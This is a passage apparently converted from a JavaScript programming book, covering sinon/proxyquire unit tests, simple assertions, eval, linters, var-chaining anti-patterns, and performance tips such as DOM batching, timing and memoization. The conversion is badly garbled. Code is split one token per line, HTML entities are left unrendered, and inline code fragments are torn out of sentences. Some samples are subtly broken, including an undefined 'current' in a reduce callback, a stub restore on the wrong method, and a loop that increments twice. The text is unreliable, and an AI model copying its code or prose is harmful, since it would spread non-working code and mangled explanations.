  chai              &minus;   as       &minus;   promised
      

  -

  
  ping
  

  

Proxyquire allows us to inject our own stub in the place of the
external ResponseProcessor. We can then use sinon to spy on that
stub&apos;s methods. We use the extensions to chai that injects to check
that the () method&apos;s promise is fullfilled, and that it eventually
returns the required response.

import

{

expect

}

from

&apos;chai&apos;

;

import

sinon from

&apos;sinon&apos;

;

import

proxyquire from

&apos;proxyquire&apos;

;

**let**

formattingStub

=

{

wrapResponse

:

(

)

=&gt;

{

}

}

**let**

ping

=

proxyquire

(

&apos;../../../src/api/ping&apos;

,

{

&apos;../utils/formatting&apos;

:

formattingStub

}

)

;

describe

(

&apos;ping&apos;

,

(

)

=&gt;

{

**let**

wrapResponseSpy

,

pingResult

;

**const**

response

=

&apos;some response&apos;

;

beforeEach

(

(

)

=&gt;

{

wrapResponseSpy

=

sinon.

stub

(

formattingStub

,

&apos;wrapResponse&apos;

)

.

returns

(

response

)

;

pingResult

=

ping

(

)

;

}

)

afterEach

(

(

)

=&gt;

{

formattingStub.

wrapResponse

.

restore

(

)

;

}

)

it

(

&apos;returns a fullfilled promise&apos;

,

(

)

=&gt;

{

expect

(

pingResult

)

.

to

.

be

.

fulfilled

;

}

)

it

(

&apos;eventually returns the correct response&apos;

,

(

)

=&gt;

{

expect

(

pingResult

)

.

to

.

eventually

.

equal

(

response

)

;

}

)

}

)

;

Now instead let&apos;s assume you wish to test something that uses the
response from ping.

import

{

ping

}

from

&apos;./ping&apos;

;

**const**

pingWrapper

=

(

)

=&gt;

{

ping.

then

(

(

response

)

=&gt;

{

*// do something with the response*

}

)

;

}

module.

exports

=

pingWrapper

;

To test the

pingWrapper

we leverage

1.  [sinon](http://sinonjs.org/)

2.  [proxyquire](https://github.com/thlorenz/proxyquire)

  -
  [sinon](https://github.com/substantial/sinon-stub-promise)   [-](https://github.com/substantial/sinon-stub-promise)   [stub](https://github.com/substantial/sinon-stub-promise)   [-](https://github.com/substantial/sinon-stub-promise)   [promise](https://github.com/substantial/sinon-stub-promise)
    -  

  -

3&period;

  -
  sinon                               &minus;      stub
   - 

  -

As before, Proxyquire allows us to inject our own stub in the place of
the external dependency, in this case the ping method we tested
previously. We can then use sinon to spy on that stub&apos;s methods and
leverage promise to allow us to returnsPromise. This promise can then
be resolved or rejected as we wish in the test, in order to test the
wrapper&apos;s response to that.

import

{

expect

}

from

&apos;chai&apos;

;

import

sinon from

&apos;sinon&apos;

;

import

proxyquire from

&apos;proxyquire&apos;

;

**let**

pingStub

=

{

ping

:

(

)

=&gt;

{

}

}

;

**let**

pingWrapper

=

proxyquire

(

&apos;../src/pingWrapper&apos;

,

{

&apos;./ping&apos;

:

pingStub

}

)

;

describe

(

&apos;pingWrapper&apos;

,

(

)

=&gt;

{

**let**

pingSpy

;

**const**

response

=

&apos;some response&apos;

;

beforeEach

(

(

)

=&gt;

{

pingSpy

=

sinon.

stub

(

pingStub

,

&apos;ping&apos;

)

.

returnsPromise

(

)

;

pingSpy.

resolves

(

response

)

;

pingWrapper

(

)

;

}

)

;

afterEach

(

(

)

=&gt;

{

pingStub.

wrapResponse

.

restore

(

)

;

}

)

;

it

(

&apos;wraps the ping&apos;

,

(
)
=&gt;
{
expect
(
pingSpy
)
.
to
.
have
.
been
.
calledWith
(
response
)
;
}
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 100.2: Basic Assertion
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

At its most basic level, Unit Testing in any language provides
assertions against some known or expected output.

**function**

assert

(

outcome

,

description

)

{

**var**

passFail

=

outcome

?

&apos;pass&apos;

:

&apos;fail&apos;

;

console.

log

(

passFail

,

&apos;: &apos;

,

description

)

;

**return**

outcome

;

}

;

The popular assertion method above shows us one quick and easy way to
assert a value in most web browsers and interpreters like Node.js with
virtually any version of ECMAScript.
>
A good unit test is designed to test a discreet unit of code; usually
a function.

**function**

add

(

num1

,

num2

)

{

**return**

num1

&plus;

num2

;

}

**var**

result

=

add

(

5

,

20

)

;

assert

(

result

==

24

,

&apos;add(5, 20) should return 25&hellip;&apos;

)

;

In the example above, the return value from the function

add

(

x

,

y

)

or

5

&plus;

20

is clearly

25

, so our assertion of

24

should fail, and the assert method will log a &quot;fail&quot; line.
>
If we simply modify our expected assertion outcome, the test will
succeed and the resulting output would look something like this.

assert

(

result

==

25

,

&apos;add(5, 20) should return 25&hellip;&apos;

)

;

console output

:

&gt;

pass

:

should

**return**

25

&hellip;

This simple assertion can assure that in many different cases, your
&quot;add&quot; function will always return the expected result and requires
no additional frameworks or libraries to work.

  
  **var** result                                   =    add
  -  

  

A more rigorous set of assertions would look like this (using (x,y)
for each assertion):

assert( result == 0, &apos;add(0, 0) should return 0&hellip;&apos;); assert( result
== -1, &apos;add(0, -1) should return -1&hellip;&apos;); assert( result == 1,
&apos;add(0, 1) should return 1&hellip;&apos;); And console output would be this:

&gt;

pass

:

should

**return**

0

&hellip;

&gt;

pass

:

should

**return**

&minus;

1

&hellip;

&gt;

pass

:

should

**return**

1

&hellip;

  
  **add**
  

  

We can now safely say that **(x,y)**... **should return the sum of two
integers**. We can roll these up into something like this:

**function**

test&lowbar;&lowbar;addsIntegers

(

)

{

*// expect a number of passed assertions*

**var**

passed

=

3

;

*// number of assertions to be reduced and added as Booleans*

**var**

assertions

=

&lbrack;

assert

(

add

(

0

,

0

)

==

0

,

&apos;add(0, 0) should return 0&hellip;&apos;

)

,

assert

(

add

(

0

,

&minus;

1

)

==

&minus;

1

,

&apos;add(0, -1) should return -1&hellip;&apos;

)

,

assert

(

add

(

0

,

1

)

==

1

,

&apos;add(0, 1) should return 1&hellip;&apos;

)

&rbrack;

.

reduce

(

**function**

(

previousValue

,

currentValue

)

{

**return**

previousValue

&plus;

current

;

}

)

;

**if**

(

assertions

===

passed

)

{

console.

log

(

&quot;add(x,y)&hellip; did return the sum of two integers&quot;

)

;

**return**

**true**

;

}

**else**

{

console.

log

(

&quot;add(x,y)&hellip; does not reliably return the sum of two integers&quot;

)

;

**return**

**false**

;

}

}

# Chapter 101: Evaluating JavaScript

**Parameter Details**

string The JavaScript to be evaluated.

  
  eval                    (     &apos;2 + 2&apos;
   - 

  

In JavaScript, the eval function evaluates a string as if it were
JavaScript code. The return value is the result of the evaluated
string, e.g. ) returns 4.
>
eval is available in the global scope. The lexical scope of the
evaluation is the local scope unless invoked indirectly

  
  **var** geval                  =   eval            ;   geval
  -    -

  

(e.g. (s);).

**The use of eval is strongly discouraged.** See the Remarks section for
details.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 101.1: Evaluate a string of JavaScript statements
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

x

=

5

;

**var**

str

=

&quot;if (x == 5) {console.log(&apos;z is 42&apos;); z = 42;} else z = 0; &quot;

;

console.

log

(

&quot;z is &quot;

,

eval

(

str

)

)

;

**The use of eval is strongly discouraged.** See the Remarks section
for details.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 101.2: Introduction
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

You can always run JavaScript from inside itself, although this is
**strongly discouraged** due to the security vulnerabilities it
presents (see Remarks for details).
>
To run JavaScript from inside JavaScript, simply use the below
function:

eval

(

&quot;var a = &apos;Hello, World!&apos;&quot;

)

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 101.3: Evaluation and Math
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  eval
  

  

You can set a variable to something with the () function by using
something similar to the below code:

**var**

x

=

10

;

**var**

y

=

20

;

**var**

a

=

eval

(

&quot;x &ast; y&quot;

)

&plus;

&quot;&lt;br&gt;&quot;

;

**var**

b

=

eval

(

&quot;2 + 2&quot;

)

&plus;

&quot;&lt;br&gt;&quot;

;

**var**

c

=

eval

(

&quot;x + 17&quot;

)

&plus;

&quot;&lt;br&gt;&quot;

;

**var**

res

=

a

&plus;

b

&plus;

c

;

The result, stored in the variable

res

, will be:

200
>
4
>
27
>
**The use of eval is strongly discouraged.** See the Remarks section
for details.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 102: Linters - Ensuring code quality
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 102.1: JSHint
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
[JSHint](http://jshint.com/) is an open source tool which detects
errors and potential problems in JavaScript code.
>
To lint your JavaScript you have two options.

1.  Go to [JSHint.com](http://jshint.com/) and paste your code in there
    on line text editor.

2.  Install [JSHint in your IDE](http://jshint.com/install/).

Atom: [linter-jshint](https://github.com/AtomLinter/linter-jshint)
(must have [Linter](https://github.com/steelbrain/linter) plugin
installed)
>
Sublime Text: [JSHint
Gutter](https://github.com/victorporof/Sublime-JSHint) and/or [Sublime
Linter](https://github.com/SublimeLinter/SublimeLinter-for-ST2)
>
Vim: [jshint.vim](https://github.com/walm/jshint.vim) or
[jshint2.vim](https://github.com/Shutnik/jshint2.vim)
>
Visual Studio: [VSCode
JSHint](https://github.com/Microsoft/vscode-jshint)

  
  jshintrc
  

  

A benefit of adding it to your IDE is that you can create a JSON
configuration file named . that will be used when linting your
program. This is convent if you want to share configurations between
projects.

  
  jshintrc
  

  

Example . file

{

&quot;-W097&quot;

:

**false**

,

*// Allow &quot;use strict&quot; at document level*

&quot;browser&quot;

:

**true**

,

*// defines globals exposed by modern browsers*

*http://jshint.com/docs/options/#browser*

&quot;curly&quot;

:

**true**

,

*// requires you to always put curly braces around blocks in loops and*

*conditionals http://jshint.com/docs/options/#curly*

&quot;devel&quot;

:

**true**

,

*// defines globals that are usually used for logging poor-man&apos;s
debugging:*

*console, alert, etc. http://jshint.com/docs/options/#devel*

*// List global variables (false means read only)*

&quot;globals&quot;

:

{

&quot;globalVar&quot;

:

**true**

}

,

&quot;jquery&quot;

:

**true**

,

*// This option defines globals exposed by the jQuery JavaScript
library.*

&quot;newcap&quot;

:

**false**

,

*// List any global functions or const vars*

&quot;predef&quot;

:

&lbrack;

&quot;GlobalFunction&quot;

,

&quot;GlobalFunction2&quot;

&rbrack;

,

&quot;undef&quot;

:

**true**

,

*// warn about undefined vars*

&quot;unused&quot;

:

**true**

*// warn about unused vars*

}

JSHint also allows configurations for specific lines/blocks of code

**switch**

(

operation

)

{

**case**

&apos;+&apos;

{

result

=

a

&plus;

b

;

**break**

;

}

*// JSHint W086 Expected a &apos;break&apos; statement*

*// JSHint flag to allow cases to not need a break*

*/&ast; falls through &ast;/*

**case**

&apos;&ast;&apos;

:

**case**

&apos;x&apos;

:

{

result

=

a

&ast;

b

;

**break**

;

}

}

*// JSHint disable error for variable not defined, because it is defined
in another file*

*/&ast; jshint -W117 &ast;/*

globalVariable

=

&apos;in-another-file.js&apos;

;

*/&ast; jshint +W117 &ast;/*

More configuration options are documented at
<http://jshint.com/docs/options/>

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch102-2">Section 102.2: ESLint / JSCS</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
[ESLint](http://eslint.org/) is a code style linter and formatter for
your style guide [much like
JSHint](http://www.slant.co/versus/8627/8628/%7Ejshint_vs_eslint).
ESLint merged with
[JSCS](https://medium.com/@markelog/jscs-end-of-the-line-bc9bf0b3fdb2#.h2cktyall)
in April of 2016. ESLint does take more effort to set up than JSHint,
but there are clear instructions on their
[website](http://eslint.org/docs/user-guide/getting-started) for
getting started.
>
A sample configuration for ESLint is as follows:

{

&quot;rules&quot;
:
{
&quot;semi&quot;
:
&lbrack;
&quot;error&quot;
,
&quot;always&quot;
&rbrack;
,
*// throw an error when semicolons are detected*
&quot;quotes&quot;
:
&lbrack;
&quot;error&quot;
,
&quot;double&quot;
&rbrack;
*// throw an error when double quotes are detected*
}
}
A sample configuration file where ALL rules are set to off, with
descriptions for what they do can be found
[here](https://gist.github.com/cletusw/e01a85e399ab563b1236).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch102-3">Section 102.3: JSLint</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
[JSLint](http://www.jslint.com/) is the trunk from which JSHint
branched. JSLint takes a much more opinionated stance on how to write
JavaScript code, pushing you towards only using the parts [Douglas
Crockford](http://crockford.com/) deems to be its &quot;good parts&quot;, and
away from any code that Crockford believes to have a better solution.
The following StackOverflow thread may help you decide [which linter
is right for you](http://stackoverflow.com/a/6803574/6194193). While
there are differences (here are some brief comparisons between it and
[JSHint](http://www.slant.co/versus/8627/8626/%7Ejshint_vs_jslint) /
[ESLint](http://www.slant.co/versus/8628/8626/%7Eeslint_vs_jslint)),
each option is extremely customizable.

For a more information about configuring JSLint check out
[NPM](https://www.npmjs.com/package/jslint) or
[github](https://gist.github.com/bretdavidson/3189814#file-jslint-options-descriptions).

<h2 id="ch103">Chapter 103: Anti-patterns</h2>

<h3 id="ch103-1">Section 103.1: Chaining assignments in var declarations</h3>

Chaining assignments as part of a **var** declaration will create
global variables unintentionally.

For example:
(
**function**
foo
(
)
{
**var**
a
=
b
=
0
;
}
)
(
)
console.
log
(
&apos;a: &apos;
&plus;
a
)
;
console.log
(
&apos;b: &apos;
&plus;
b
)
;

Will result in:
Uncaught ReferenceError
:
a is not defined
&apos;b: 0&apos;

In the above example, a is local but b becomes global. This is because
of the right to left evaluation of the = operator. So the above code
actually evaluated as

**var**
a
=
(
b
=
0
)
;
The correct way to chain var assignments is:
**var**
a
,
b
;
a
=
b
=
0
;
Or:
**var**
a
=
0
,
b
=
a
;
This will make sure that both a and b will be local variables.

<h3 id="ch104">Chapter 104: Performance Tips</h3>

JavaScript, like any language, requires us to be judicious in the use
of certain language features. Overuse of some features can decrease
performance, while some techniques can be used to increase
performance.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-1">Section 104.1: Avoid try/catch in performance-critical functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Some JavaScript engines (for example, the current version of Node.js
and older versions of Chrome before Ignition+turbofan) don&apos;t run the
optimizer on functions that contain a try/catch block.

If you need to handle exceptions in performance-critical code, it can
be faster in some cases to keep the try/catch in a separate function.
For example, this function will not be optimized by some
implementations:

**function**
myPerformanceCriticalFunction
(
)
{
**try**
{
*// do complex calculations here*
}
**catch**
(
e
)
{
console.log
(
e
)
;
}
}

However, you can refactor to move the slow code into a separate
function (that *can* be optimized) and call it from inside the **try**
block.

*// This function can be optimized*
**function**
doCalculations
(
)
{
*// do complex calculations here*
}
*// Still not always optimized, but it&apos;s not doing much so the
performance doesn&apos;t matter*
**function**
myPerformanceCriticalFunction
(
)
{
**try**
{
doCalculations
(
)
;
}
**catch**
(
e
)
{
console.
log
(
e
)
;
}
}

Here&apos;s a jsPerf benchmark showing the difference:
<https://jsperf.com/try-catch-deoptimization>. In the current version
of most browsers, there shouldn&apos;t be much difference if any, but in
less recent versions of Chrome and Firefox, or IE, the version that
calls a helper function inside the try/catch is likely to be faster.

Note that optimizations like this should be made carefully and with
actual evidence based on profiling your code. As

JavaScript engines get better, it could end up hurting performance
instead of helping, or making no difference at all (but complicating
the code for no reason). Whether it helps, hurts, or makes no
difference can depend on a lot of factors, so always measure the
effects on your code. That&apos;s true of all optimizations, but
especially microoptimizations like this that depend on low-level
details of the compiler/runtime.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-2">Section 104.2: Limit DOM Updates</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

A common mistake seen in JavaScript when run in a browser environment
is updating the DOM more often than necessary.

The issue here is that every update in the DOM interface causes the
browser to re-render the screen. If an update changes the layout of an
element in the page, the entire page layout needs to be re-computed,
and this is very performance-heavy even in the simplest of cases. The
process of re-drawing a page is known as *reflow* and can cause a
browser to run slowly or even become unresponsive.

The consequence of updating the document too frequently is illustrated
with the following example of adding items to a list.
 
  **&lt;ul**
  
  
Consider the following document containing a **&gt;** element:
&lt;!
DOCTYPE html
**&gt;**
**&lt;**
**html**
**&gt;**
**&lt;**
**body**
**&gt;**
**&lt;**
**ul**
id
=
&quot;list&quot;
**&gt;**
**&lt;**
**/ul**
**&gt;**
**&lt;**
**/body**
**&gt;**
**&lt;**
**/html**
**&gt;**
We add 5000 items to the list looping 5000 times (you can try this
with a larger number on a powerful computer to increase the effect).
**var**
list
=
document.
getElementById
(
&quot;list&quot;
)
;
**for**
(
**var**
i
=
1
;
i
&lt;=
5000
;
i
++
)
{
list.
innerHTML
+=
&grave;
&lt;
li
&gt;
item &dollar;
{
i
}
&lt;
/
li
&gt;
&grave;
;
*// update 5000 times*
}
In this case, the performance can be improved by batching all 5000
changes in one single DOM update.
**var**
list
=
document.
getElementById
(
&quot;list&quot;
)
;
**var**
html
=
&quot;&quot;
;
**for**
(
**var**
i
=
1
;
i
&lt;=
5000
;
i
++
)
{
html
+=
&grave;
&lt;
li
&gt;
item &dollar;
{
i
}
&lt;
/
li
&gt;
&grave;
;
}
list.
innerHTML
=
html
;
*// update once*

  
  [document.createDocumentFragment](https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment)
  

  

The function
[()](https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment)
can be used as a lightweight container for the HTML created by
>
the loop. This method is slightly faster than modifying the container
element&apos;s innerHTML property (as shown below).

**var**
list
=
document.
getElementById
(
&quot;list&quot;
)
;
**var**
fragment
=
document.
createDocumentFragment
(
)
;
**for**
(
**var**
i
=
1
;
i
&lt;=
5000
;
i
++
)
{
li
=
document.
createElement
(
&quot;li&quot;
)
;
li&period;
innerHTML
=
&quot;item &quot;
&plus;
i
;
fragment.
appendChild
(
li
)
;
i
++
;
}
list.
appendChild
(
fragment
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-3">Section 104.3: Benchmarking your code - measuring execution time</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
Most performance tips are very dependent of the current state of JS
engines and are expected to be only relevant at a given time. The
fundamental law of performance optimization is that you must first
measure before trying to optimize, and measure again after a presumed
optimization.

To measure code execution time, you can use different time measurement
tools like:

[Performance](https://developer.mozilla.org/en-US/docs/Web/API/Performance)
interface that represents timing-related performance information for
the given page (only available in browsers).

[process.hrtime](https://nodejs.org/api/process.html#process_process_hrtime_time)
on Node.js gives you timing information as &lbrack;seconds, nanoseconds&rbrack;
tuples. Called without argument it returns an arbitrary time but
called with a previously returned value as argument it returns the
difference between the two executions.

  -
  console.time                        (   &quot;labelName&quot;
    -

  -

[Console
timers](https://developer.mozilla.org/en-US/docs/Web/API/Console/time)
) starts a timer you can use to track how long an operation takes. You

give each timer a unique label name, and may have up to 10,000 timers
running on a given page. When you call

  console.timeEnd                         (   &quot;labelName&quot;
    

) with the same name, the browser will finish the timer for given name
and output

the time in milliseconds, that elapsed since the timer was started.
The strings passed to time() and timeEnd() must match otherwise the
timer will not finish.
  
  Date                                .        now
   
  
[Date.now](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/now)
function () returns current [Timestamp](http://www.unixtimestamp.com/)
in milliseconds, which is a
[Number](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number)
representation of time since 1 January 1970 00:00:00 UTC until now.
The method now() is a static method of Date, therefore you always use
it as Date.now().

  
  performance.now
  

  

**Example 1** using: ()
>
In this example we are going to calculate the elapsed time for the
execution of our function, and we are going to use the
[Performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)
method that returns a
[DOMHighResTimeStamp](https://developer.mozilla.org/en-US/docs/Web/API/DOMHighResTimeStamp),
measured in milliseconds, accurate to one thousandth of a millisecond.

**let**
startTime
,
endTime
;
**function**
myFunction
(
)
{
*//Slow code you want to measure*
}
*//Get the start time*
startTime
=
performance.
now
(
)
;
*//Call the time-consuming function*
myFunction
(
)
;
*//Get the end time*
endTime
=
performance.
now
(
)
;
*//The difference is how many milliseconds it took to call myFunction()*
console.
debug
(
&apos;Elapsed time:&apos;
,
(
endTime
&minus;
startTime
)
)
;
The result in console will look something like this:
Elapsed time
:
0.10000000009313226
 
  [performance.now](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)

 
Usage of
[()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)
has the highest precision in browsers with accuracy to one thousandth
of a millisecond, but the lowest
[compatibility](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now#Browser_compatibility).
  
  Date                                .        now
   
**Example 2** using: ()

In this example we are going to calculate the elapsed time for the
initialization of a big array (1 million values), and
 
  Date                                .        now
 
we are going to use the () method

**let** t0 = Date.now(); *//stores current Timestamp in milliseconds
since 1 January 1970 00:00:00 UTC* **let** arr = &lbrack;&rbrack;; *//store empty
array* **for** (**let** i = 0; i &lt; 1000000; i++) { *//1 million
iterations* arr.push(i); *//push current i value*
}
console.
log
(
Date
.
now
(
)
&minus;
t0
)
;
*//print elapsed time between stored t0 and now*

  
  console.time       (   &quot;label&quot;   ) &   console.timeEnd        (   &quot;label&quot;

**Example 3** using: )
  
  console.time                               (   &quot;label&quot;
  console.timeEnd                               (    &quot;label&quot;

In this example we are doing the same task as in Example 2, but we are
going to use the ) & ) methods

console.time
(
&quot;t&quot;
)
;
*//start new timer for label name: &quot;t&quot;*
**let**
arr
=
&lbrack;
&rbrack;
;
*//store empty array*
**for**
(
**let**
i
=
0
;
i
&lt;
1000000
;
i
++
)
{
*//1 million iterations*
arr.
push
(
i
)
;
*//push current i value*
}
console.
timeEnd
(
&quot;t&quot;
)
;
*//stop the timer for label name: &quot;t&quot; and print elapsed time*
  
  process.hrtime

 
**Exemple 4** using ()

In Node.js programs this is the most precise way to measure spent
time.
**let**
start
=
process.
hrtime
(
)
;
*// long execution here, maybe asynchronous*
**let**
diff
=
process.
hrtime
(
start
)
;
*// returns for example &lbrack; 1, 2325 &rbrack;*
console.
log
(
&grave;Operation took &dollar;
{
diff
&lbrack;
0
&rbrack;
&ast;
1e9
&plus;
diff
&lbrack;
1
&rbrack;
}
nanoseconds&grave;
)
;
*// logs: Operation took 1000002325 nanoseconds*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch104-4">Section 104.4: Use a memoizer for heavy-computing functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
If you are building a function that may be heavy on the processor
(either clientside or serverside) you may want to consider a
**memoizer** which is a *cache of previous function executions and
their returned values*. This allows you to check if the parameters of
a function were passed before. Remember, pure functions are those that
given an input, return a corresponding unique output and don&apos;t cause
side-effects outside their scope so, you should not add memoizers to
functions that are unpredictable or depend on external resources (like
AJAX calls or randomly returned values).

Let&apos;s say I have a recursive factorial function:
**function**
fact
(
num
)
{
**return**
(
num
===
0
)
?
1
:
num
&ast;
fact
(
num
&minus;
1
)
;
}

If I pass small values from 1 to 100 for example, there would be no
problem, but once we start going deeper, we might blow up the call
stack or make the process a bit painful for the JavaScript engine
we&apos;re doing this in, especially if the engine doesn&apos;t count with
tail-call optimization (although Douglas Crockford says that native
ES6 has tail-call optimization included).

We could hard code our own dictionary from 1 to god-knows-what number
with their corresponding factorials but, I&apos;m not sure if I advise
that! Let&apos;s create a memoizer, shall we?

**var**
fact
=
(
**function**
(
)
{
**var**
cache
=
{
}
;
*// Initialise a memory cache object*
*// Use and return this function to check if val is cached*
**function**
checkCache
(
val
)
{
**if**
(
val
**in**
cache
)
{
console.
log
(
&apos;It was in the cache :D&apos;
)
;
**return**
cache
&lbrack;
val
&rbrack;
;
*// return cached*
}
**else**
{
cache
&lbrack;
val
&rbrack;
=
factorial
(
val
)
;
*// we cache it*
**return**
cache
&lbrack;
val
&rbrack;
;
*// and then return it*
}
*/&ast; Other alternatives for checking are:*
*&vert;&vert; cache.hasOwnProperty(val) or !!cache&lbrack;val&rbrack;*
*&vert;&vert; but wouldn&apos;t work if the results of those*
*&vert;&vert; executions were falsy values.*
*&ast;/*
}
*// We create and name the actual function to be used*
**function**
factorial
(
num
)
{
**return**
(
num
===
0
)
?
1
:
num
&ast;
factorial
(
num
&minus;
1
)
;
}
*// End of factorial function*
*/&ast; We return the function that checks, not the one*
*&vert;&vert; that computes because it happens to be recursive,*
*&vert;&vert; if it weren&apos;t you could avoid creating an extra*
*&vert;&vert; function in this self-invoking closure function.*
*&ast;/*
**return**
checkCache
;
}
(
)
)
;
Now we can start using it:
![](./images/image054.jpg){width="4.252083333333333in"
height="0.9909722222222223in"}

Now that I start to reflect on what I did, if I were to increment from
1 instead of decrement from *num*, I could have cached all of the
factorials from 1 to *num* in the cache recursively, but I will leave
that for you.

This is great but what if we have **multiple parameters**? This is a
problem? Not quite, we can do some nice tricks like using
JSON.stringify() on the arguments array or even a list of values that
the function will depend on (for object-oriented approaches). This is
done to generate a unique key with all the arguments and dependencies
included.

We can also create a function that &quot;memoizes&quot; other functions, using
the same scope concept as before (returning a new function that uses
the original and has access to the cache object):
  
  **var** args

WARNING: ES6 syntax, if you don&apos;t like it, replace &hellip; with nothing
and use the =
  
  Array    .   **prototype**   .   slice    .   call   (   **null**   ,   arguments
  
); trick; replace const and let with var, and the other things you
already know.
**function**
memoize
(
func
)
{
**let**
cache
=
{
}
;
*// You can opt for not naming the function*
**function**
memoized
(
&hellip;
args
)
{
**const**
argsKey
=
JSON.
stringify
(
args
)
;
*// The same alternatives apply for this example*
**if**
(
argsKey
**in**
cache
)
{
console.
log
(
argsKey
&plus;
&apos; was/were in cache :D&apos;
)
;
**return**
cache
&lbrack;
argsKey
&rbrack;
;
}
**else**
{
cache
&lbrack;
argsKey
&rbrack;
=
func.
apply
(
**null**
,
args
)
;
*// Cache it*
**return**
cache
&lbrack;
argsKey
&rbrack;
;
*// And then return it*
}
}
**return**
memoized
;
*// Return the memoized function*
}
  func.apply                        (   **null**      ,   args

Now notice that this will work for multiple arguments but won&apos;t be of
much use in object-oriented methods I think, you may need an extra
object for dependencies. Also, ) can be replaced with
  
  func                    (     &hellip;args

) since array destructuring will send them separately instead of as an
array form. Also, just for
  
  Function                .   **prototype**              .   apply
 
reference, passing an array as an argument to func won&apos;t work unless
you use as I did.
To use the above method you just:
**const**
newFunction
=
memoize
(
oldFunction
)
;
*// Assuming new oldFunction just sums/concatenates:*
newFunction
(
&apos;meaning of life&apos;
,
42
)
;
*// -&amp;quot;meaning of life42&quot;*
newFunction
(
&apos;meaning of life&apos;
,
42
)
;
*// again*
*// =&amp;lbrack;&quot;meaning of life&quot;,42&rbrack; was/were in cache :D*
*// -&amp;quot;meaning of life42&quot;*
